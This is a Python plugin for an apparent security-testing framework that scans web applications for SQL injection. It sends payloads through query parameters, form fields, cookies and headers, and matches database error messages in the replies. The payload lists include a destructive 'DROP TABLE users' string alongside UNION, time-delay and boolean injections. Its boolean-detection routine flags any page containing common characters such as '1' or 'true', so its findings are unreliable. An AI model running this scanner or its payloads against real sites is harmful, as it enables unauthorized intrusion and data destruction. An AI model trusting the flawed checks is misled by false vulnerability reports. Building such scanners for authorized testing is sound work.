import asyncio
import aiohttp
import urllib.parse
from typing import Dict, Any, List, Tuple
from datetime import datetime
import re
import sys
sys.path.append('..')

from core.base_plugin import BasePlugin, PluginResult, PluginStatus, Vulnerability, Severity


class SQLInjectionScanner(BasePlugin):
    def __init__(self):
        super().__init__(
            name="SQLInjectionScanner",
            version="1.0.0",
            description="SQL injection vulnerability scanner for web applications"
        )
        
        # SQL injection payloads for different database types
        self.payloads = {
            "error_based": [
                "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1",
                "' OR 1=1--", "\" OR 1=1--", "' OR 1=1#", "\" OR 1=1#",
                "'; DROP TABLE users--", "\"; DROP TABLE users--",
                "' UNION SELECT NULL--", "\" UNION SELECT NULL--",
                "' AND 1=2 UNION SELECT NULL,NULL--",
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION(), 0x7e))--"
            ],
            "boolean_based": [
                "' AND 1=1--", "' AND 1=2--", "\" AND 1=1--", "\" AND 1=2--",
                "' AND 'a'='a", "' AND 'a'='b", "\" AND \"a\"=\"a", "\" AND \"a\"=\"b",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>999999--"
            ],
            "time_based": [
                "'; WAITFOR DELAY '00:00:05'--", "\"; WAITFOR DELAY '00:00:05'--",
                "'; SELECT SLEEP(5)--", "\"; SELECT SLEEP(5)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "'; pg_sleep(5)--", "\"; pg_sleep(5)--"
            ],
            "union_based": [
                "' UNION SELECT NULL--", "\" UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--", "\" UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--", "\" UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT user(),version(),database()--",
                "' UNION SELECT @@version--", "\" UNION SELECT @@version--"
            ]
        }
        
        # Database-specific error patterns
        self.error_patterns = {
            "mysql": [
                r"MySQL server version",
                r"mysql_fetch_array",
                r"mysql_num_rows",
                r"Warning.*mysql_.*",
                r"supplied argument is not a valid MySQL",
                r"Column count doesn't match value count",
                r"Duplicate entry.*for key",
                r"MySQL Query fail"
            ],
            "mssql": [
                r"Microsoft OLE DB Provider for SQL Server",
                r"Unclosed quotation mark after the character string",
                r"Microsoft SQL Native Client error",
                r"Incorrect syntax near",
                r"Line 1: Incorrect syntax near",
                r"Column name or number of supplied values",
                r"String or binary data would be truncated"
            ],
            "oracle": [
                r"ORA-\d{5}",
                r"Oracle error",
                r"Oracle.*Driver",
                r"Warning.*oci_.*",
                r"Warning.*ora_.*"
            ],
            "postgresql": [
                r"PostgreSQL query failed",
                r"Warning.*pg_.*",
                r"invalid input syntax for type",
                r"Query failed: ERROR:",
                r"Warning: pg_query()"
            ],
            "sqlite": [
                r"SQLite/JDBCDriver",
                r"SQLite.Exception",
                r"System.Data.SQLite.SQLiteException",
                r"Warning.*sqlite_.*",
                r"SQLITE_ERROR"
            ]
        }
        
        # Common parameter names to test
        self.common_params = [
            "id", "user", "username", "email", "search", "q", "query",
            "name", "page", "cat", "category", "file", "view", "action",
            "cmd", "exec", "do", "func", "load", "path", "lang", "debug"
        ]
    
    def validate_options(self, options: Dict[str, Any]) -> bool:
        return "url" in options
    
    async def execute(self, target: str, options: Dict[str, Any]) -> PluginResult:
        self.status = PluginStatus.RUNNING
        
        url = options.get("url", f"http://{target}")
        if not url.startswith(("http://", "https://")):
            url = f"http://{url}"
        
        max_concurrent = options.get("max_concurrent", 10)
        timeout = options.get("timeout", 10)
        test_params = options.get("params", self.common_params)
        
        vulnerabilities_found = []
        
        try:
            connector = aiohttp.TCPConnector(limit=max_concurrent)
            timeout_config = aiohttp.ClientTimeout(total=timeout)
            
            async with aiohttp.ClientSession(
                connector=connector,
                timeout=timeout_config,
                headers={"User-Agent": "Mozilla/5.0 (Compatible Security Scanner)"}
            ) as session:
                
                # Test different injection points
                vulnerabilities_found.extend(await self._test_get_parameters(session, url, test_params))
                vulnerabilities_found.extend(await self._test_post_parameters(session, url, test_params))
                vulnerabilities_found.extend(await self._test_cookies(session, url))
                vulnerabilities_found.extend(await self._test_headers(session, url))
                
        except Exception as e:
            self.status = PluginStatus.FAILED
            return PluginResult(
                plugin_name=self.name,
                status=self.status,
                data={"error": str(e)},
                errors=[str(e)]
            )
        
        # Add vulnerabilities to the plugin
        for vuln_data in vulnerabilities_found:
            vuln = Vulnerability(
                title=f"SQL Injection - {vuln_data['type']}",
                description=vuln_data['description'],
                severity=vuln_data['severity'],
                affected_component=vuln_data['url'],
                recommendation="Use parameterized queries and input validation",
                evidence=vuln_data['evidence']
            )
            self.add_vulnerability(vuln)
        
        self.status = PluginStatus.COMPLETED
        result_data = {
            "target": target,
            "url": url,
            "vulnerabilities_found": len(vulnerabilities_found),
            "vulnerability_details": vulnerabilities_found,
            "timestamp": datetime.now().isoformat()
        }
        
        result = PluginResult(
            plugin_name=self.name,
            status=self.status,
            data=result_data,
            timestamp=datetime.now().isoformat()
        )
        
        self.results.append(result)
        return result
    
    async def _test_get_parameters(self, session: aiohttp.ClientSession, url: str, params: List[str]) -> List[Dict]:
        """Test GET parameters for SQL injection"""
        vulnerabilities = []
        
        for param in params:
            for payload_type, payloads in self.payloads.items():
                for payload in payloads[:3]:  # Limit payloads per parameter
                    vuln = await self._test_parameter(session, url, param, payload, "GET", payload_type)
                    if vuln:
                        vulnerabilities.append(vuln)
                        break  # Found vulnerability, move to next parameter
        
        return vulnerabilities
    
    async def _test_post_parameters(self, session: aiohttp.ClientSession, url: str, params: List[str]) -> List[Dict]:
        """Test POST parameters for SQL injection"""
        vulnerabilities = []
        
        for param in params:
            for payload_type, payloads in self.payloads.items():
                for payload in payloads[:3]:  # Limit payloads per parameter
                    vuln = await self._test_parameter(session, url, param, payload, "POST", payload_type)
                    if vuln:
                        vulnerabilities.append(vuln)
                        break  # Found vulnerability, move to next parameter
        
        return vulnerabilities
    
    async def _test_cookies(self, session: aiohttp.ClientSession, url: str) -> List[Dict]:
        """Test cookies for SQL injection"""
        vulnerabilities = []
        
        # First, get any existing cookies
        try:
            async with session.get(url) as response:
                existing_cookies = response.cookies
        except:
            return vulnerabilities
        
        # Test cookie injection
        for cookie_name in ["PHPSESSID", "JSESSIONID", "ASP.NET_SessionId", "session_id"]:
            for payload in self.payloads["error_based"][:2]:
                vuln = await self._test_cookie_injection(session, url, cookie_name, payload)
                if vuln:
                    vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    async def _test_headers(self, session: aiohttp.ClientSession, url: str) -> List[Dict]:
        """Test HTTP headers for SQL injection"""
        vulnerabilities = []
        
        headers_to_test = ["X-Forwarded-For", "X-Real-IP", "User-Agent", "Referer"]
        
        for header in headers_to_test:
            for payload in self.payloads["error_based"][:2]:
                vuln = await self._test_header_injection(session, url, header, payload)
                if vuln:
                    vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    async def _test_parameter(self, session: aiohttp.ClientSession, url: str, param: str, 
                             payload: str, method: str, payload_type: str) -> Dict:
        """Test a specific parameter with a payload"""
        if self._rate_limiter:
            async with self._rate_limiter:
                return await self._perform_injection_test(session, url, param, payload, method, payload_type)
        return await self._perform_injection_test(session, url, param, payload, method, payload_type)
    
    async def _perform_injection_test(self, session: aiohttp.ClientSession, url: str, 
                                     param: str, payload: str, method: str, payload_type: str) -> Dict:
        """Perform the actual injection test"""
        try:
            if method == "GET":
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                async with session.get(test_url) as response:
                    content = await response.text()
                    return self._analyze_response(response, content, test_url, param, payload, payload_type)
            
            elif method == "POST":
                data = {param: payload}
                async with session.post(url, data=data) as response:
                    content = await response.text()
                    return self._analyze_response(response, content, url, param, payload, payload_type)
        
        except Exception:
            pass
        
        return {}
    
    async def _test_cookie_injection(self, session: aiohttp.ClientSession, url: str, 
                                   cookie_name: str, payload: str) -> Dict:
        """Test cookie injection"""
        try:
            cookies = {cookie_name: payload}
            async with session.get(url, cookies=cookies) as response:
                content = await response.text()
                return self._analyze_response(response, content, url, f"Cookie:{cookie_name}", payload, "cookie")
        except Exception:
            pass
        
        return {}
    
    async def _test_header_injection(self, session: aiohttp.ClientSession, url: str, 
                                   header_name: str, payload: str) -> Dict:
        """Test header injection"""
        try:
            headers = {header_name: payload}
            async with session.get(url, headers=headers) as response:
                content = await response.text()
                return self._analyze_response(response, content, url, f"Header:{header_name}", payload, "header")
        except Exception:
            pass
        
        return {}
    
    def _analyze_response(self, response, content: str, url: str, param: str, 
                         payload: str, injection_type: str) -> Dict:
        """Analyze response for SQL injection indicators"""
        
        # Check for database errors
        db_type, error_found = self._check_database_errors(content)
        if error_found:
            return {
                "type": f"{injection_type.title()} Parameter SQL Injection",
                "description": f"SQL injection vulnerability found in {param} parameter. Database: {db_type}",
                "severity": Severity.CRITICAL,
                "url": url,
                "evidence": {
                    "parameter": param,
                    "payload": payload,
                    "database_type": db_type,
                    "error_found": True,
                    "response_status": response.status,
                    "injection_point": injection_type
                }
            }
        
        # Check for boolean-based indicators
        if injection_type == "boolean_based":
            # This would require multiple requests to compare responses
            # For now, we'll check for common boolean injection patterns
            if self._check_boolean_indicators(content):
                return {
                    "type": f"{injection_type.title()} Parameter Boolean SQL Injection",
                    "description": f"Potential boolean-based SQL injection in {param} parameter",
                    "severity": Severity.HIGH,
                    "url": url,
                    "evidence": {
                        "parameter": param,
                        "payload": payload,
                        "boolean_indicators": True,
                        "response_status": response.status,
                        "injection_point": injection_type
                    }
                }
        
        # Check for UNION-based indicators
        if injection_type == "union_based" and "UNION" in payload.upper():
            if self._check_union_indicators(content):
                return {
                    "type": f"{injection_type.title()} Parameter UNION SQL Injection",
                    "description": f"Potential UNION-based SQL injection in {param} parameter",
                    "severity": Severity.CRITICAL,
                    "url": url,
                    "evidence": {
                        "parameter": param,
                        "payload": payload,
                        "union_indicators": True,
                        "response_status": response.status,
                        "injection_point": injection_type
                    }
                }
        
        return {}
    
    def _check_database_errors(self, content: str) -> Tuple[str, bool]:
        """Check for database-specific error messages"""
        for db_type, patterns in self.error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    return db_type, True
        return "unknown", False
    
    def _check_boolean_indicators(self, content: str) -> bool:
        """Check for boolean-based SQL injection indicators"""
        # Look for common boolean injection response patterns
        boolean_indicators = [
            r"true|false",
            r"1|0",
            r"yes|no",
            r"success|fail"
        ]
        
        for indicator in boolean_indicators:
            if re.search(indicator, content, re.IGNORECASE):
                return True
        
        return False
    
    def _check_union_indicators(self, content: str) -> bool:
        """Check for UNION-based SQL injection indicators"""
        # Look for signs that UNION injection might be working
        union_indicators = [
            r"mysql_fetch_array",
            r"Warning.*supplied argument",
            r"Column count doesn't match",
            r"The used SELECT statements have a different number of columns"
        ]
        
        for indicator in union_indicators:
            if re.search(indicator, content, re.IGNORECASE):
                return True
        
        return False